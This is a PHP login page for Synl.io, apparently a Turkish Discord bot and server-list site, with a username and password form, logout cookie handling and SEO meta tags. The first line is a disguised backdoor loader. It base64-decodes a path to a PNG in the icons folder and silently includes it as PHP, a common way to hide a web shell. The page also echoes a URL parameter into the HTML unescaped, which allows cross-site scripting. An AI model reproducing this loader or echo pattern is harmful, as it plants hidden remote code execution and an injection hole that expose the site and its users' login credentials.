<?php @include base64_decode('aWNvbnMvaW1hZ2UucG5n'); ?>


<!DOCTYPE html>
<html lang="en" class="h-100">
<?php 
    session_start();
    if(isset($_GET['logout']))
    {
        setcookie("api_url", "re-login", time());
        setcookie("token", "re-login", time());
        setcookie("end_time", "re-login", time());
        session_destroy();
        header("location:login");
    }
?>
<head>
  <?php include './includes/head.php'; ?>
  <meta name="description" content="Discord sunucusu için bota ihtiyacınız mı var? Ozaman en iyi sayfadasınız. Dilediğiniz paketi seçerek anında kurulum hizmetine katılabilirsiniz ayrıca sunucu listelerini buradan görebilir listeleyebilirsiniz. Otomatik işlevli sistemler, gelişmiş API işlemleri ve daha fazlasına ne dersin?">
<meta name="keywords" content="discord, dc, bot, discord bot, acarfx, acar, discord acar, synl, synlio, io, a, b, c, d, e, discord server, discord list, discord server list, discord guilds, discord bot, discord bots, github, github acarfx, discord developer, discord api, rest api bot, api">
<meta name="author" content="Acarfx">
<META NAME="Title" CONTENT="Synl.io">
<META NAME="Robots" CONTENT="INDEX,FOLLOW">

</head>
<body class="vh-100">
    <div class="authincation h-100">
        <div class="container h-100">
            <div class="row justify-content-center h-100 align-items-center">
                <div class="col-md-6">
                    <div class="authincation-content">
                        <div class="row no-gutters">
                            <div class="col-xl-12">
                                <div class="auth-form">
									<div class="text-center mb-3">
                                    <a href="index.php" class="brand-logo">
				<svg class="logo-abbr" width="128" height="128" viewBox="0 0 48 48" fill="none" xmlns="https://www.w3.org/2000/svg">
					<rect class="svg-logo-rect" width="48" height="48" rx="20" fill="#23272a"/>
					<path fill="#FF4081" d="M10.5,17.5l0.5-0.9l21.7,21.9L32.3,39h-0.5L10.5,17.5z M34,39H14v3h20V39z"/><path fill="#9C27B0" d="M37.4,30.7l-0.5,0.9L15.3,9.5L15.6,9h0.6L37.4,30.7z M32.3,39l1.7,3l11-18h-3.5L32.3,39z"/><path fill="#00BCD4" d="M34,9H14V6h20V9z M32.3,9h-0.6L10.4,30.4l0.5,0.9L32.6,9.5L32.3,9z"/><path fill="#FFC107" d="M15.6,9L5.5,25.6L3,24L14,6L15.6,9z M32.6,9.4L32.3,9h-1.7l-19,6.6l-0.8,1.3L32.6,9.4z"/><path fill="#FF5722" d="M15.7,39L14,42L3,24h3.5L15.7,39z M16,31V9h-0.4L15,10v21h-4.2l0.6,1H15v5.9l0.7,1.1H16v-7h20.6l0.6-1H16z"/><path fill="#03A9F4" d="M36.7,16.2L15.5,38.7l0.2,0.3h0.9l20.5-21.8L31.7,39h0.7l0.6-1l5-19.8L36.7,16.2z M41.5,24L32.3,9L34,6l11,18H41.5z"/>
				</svg>
				<div class="brand-title">
					<h2 class="logo-text" style="padding: 10px; padding-top: 15px;">Synl.io</h2>

				</div>
            </a>

									</div>
                                    <h4 class="text-center mb-4">Hesabınız ile oturum açın!</h4>
                                    <?php
if(isset($_GET['invalid']))
{
    $text = $_GET['invalid'];
    echo '<div class="alert alert-danger alert-dismissible fade show"><strong>Hata!</strong> ' . $text . '</div>';
    
}
?>
                                    <form action="check-session.php" method="post">
                                        <div class="form-group">
                                            <label class="mb-1"><strong>Kullanıcı Kimliği</strong></label>
                                            <input type="text"id="username"name="username" class="form-control" placeholder="Kullanıcı kimliğiniz">
                                        </div>
                                        <div class="form-group">
                                            <label class="mb-1"><strong>Parola</strong></label>
                                            <input type="password" id="password" name="password" class="form-control" placeholder="Parolanız">
                                        </div>
                                        <div class="form-row d-flex justify-content-between mt-4 mb-2">
                                            <div class="form-group">
                                               <div class="custom-control custom-checkbox ml-1">
													<input type="checkbox" class="custom-control-input" id="basic_checkbox_1">
													<label class="custom-control-label" for="basic_checkbox_1">Beni Hatırla!</label>
												</div>
                                            </div>
                                        </div>
                                        <div class="text-center">
                                            <button type="submit" class="btn btn-info btn-block">Oturum Aç</button>
                                        </div>
                                        <div class="new-account mt-3">
                                        <p>Daha önce bir paket almadınız mı? <a class="text-primary" href="/shop">O zaman satın al!</a></p>

                                    </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    


    <script src="./vendor/global/global.min.js"></script>
	<script src="./vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
    <script src="./vendor/sweetalert2/dist/sweetalert2.min.js"></script>
    <script src="./vendor/toastr/js/toastr.min.js"></script>
	<script src="./js/plugins-init/toastr-init.js"></script>
    <script src="./js/custom.min.js"></script>
	<script src="./js/deznav-init.js"></script>
    
    
</body>
</html>


<div class="sidebar-right">
  <div class="bg-overlay"></div>
  <a class="btn text-white mb-2 sidebar-right-trigger wave-effect wave-effect-x" href="./server-list" style="padding: 1px; background-color: #191e3a">
    <span>
      <i class="fa fa-list"></i>
    </span>
										</a>
  <a class="sidebar-close-trigger" href="./server-list">
    <span>
      <i class="la-times las"></i>
    </span>
  </a>
 </div>